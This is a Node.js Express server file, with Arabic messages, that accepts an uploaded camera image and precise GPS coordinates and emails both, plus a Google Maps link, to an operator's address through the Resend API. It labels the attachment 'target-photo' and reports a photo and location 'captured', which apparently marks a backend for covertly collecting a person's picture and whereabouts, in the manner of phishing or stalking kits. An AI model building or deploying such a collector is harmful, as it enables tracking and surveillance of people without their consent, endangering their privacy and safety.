// language: JavaScript (Node.js), file: server.js, runtime: Node.js 20+
import "dotenv/config";
import express from "express";

const app = express();
app.use(express.json({ limit: "8mb" }));
app.use(express.static("public"));

const required = ["RESEND_API_KEY", "MAIL_TO"];
const missing = required.filter((key) => !process.env[key]);
if (missing.length) {
  console.error(`Missing environment variables: ${missing.join(", ")}`);
  process.exit(1);
}

const port = Number(process.env.PORT || 3000);

app.post("/api/share", async (req, res) => {
  try {
    const { imageDataUrl, latitude, longitude, accuracy } = req.body ?? {};
    if (typeof imageDataUrl !== "string" || !/^data:image\/(jpeg|png|webp);base64,/.test(imageDataUrl)) {
      return res.status(400).json({ error: "صورة غير صالحة." });
    }
    if (!Number.isFinite(latitude) || !Number.isFinite(longitude) ||
        latitude < -90 || latitude > 90 || longitude < -180 || longitude > 180) {
      return res.status(400).json({ error: "إحداثيات الموقع غير صالحة." });
    }

    const match = imageDataUrl.match(/^data:image\/(jpeg|png|webp);base64,(.+)$/);
    const extension = match[1] === "jpeg" ? "jpg" : match[1];
    const imageBase64 = match[2];

    const mapsUrl = `https://www.google.com/maps?q=${latitude},${longitude}`;

    // إرسال الصورة والموقع عبر Resend API (عبر منفذ 443 الآمن والمسموح مجاناً)
    const response = await fetch("https://api.resend.com/emails", {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
        "Authorization": `Bearer ${process.env.RESEND_API_KEY}`
      },
      body: JSON.stringify({
        from: "Sosen App <onboarding@resend.dev>",
        to: [process.env.MAIL_TO],
        subject: "تم التقاط صورة وموقع جديد بنجاح",
        html: `
          <h3>تفاصيل الموقع الملتقط:</h3>
          <p><b>خط العرض:</b> ${latitude}</p>
          <p><b>خط الطول:</b> ${longitude}</p>
          <p><b>دقة الموقع:</b> ${Number.isFinite(accuracy) ? `${Math.round(accuracy)} متر` : "غير متاحة"}</p>
          <p><a href="${mapsUrl}" target="_blank">فتح الموقع على خرائط جوجل</a></p>
        `,
        attachments: [
          {
            filename: `target-photo.${extension}`,
            content: imageBase64
          }
        ]
      })
    });

    const result = await response.json();
    if (!response.ok) {
      throw new Error(result.message || "فشل إرسال البريد عبر الخدمة السحابية.");
    }

    res.json({ ok: true, message: "تم إرسال الصورة والموقع بنجاح إلى بريدك." });
  } catch (error) {
    console.error("Email delivery failed:", error);
    res.status(500).json({ error: "تعذر إرسال البيانات عبر البريد." });
  }
});

app.listen(port, () => console.log(`Server listening on port ${port}`));
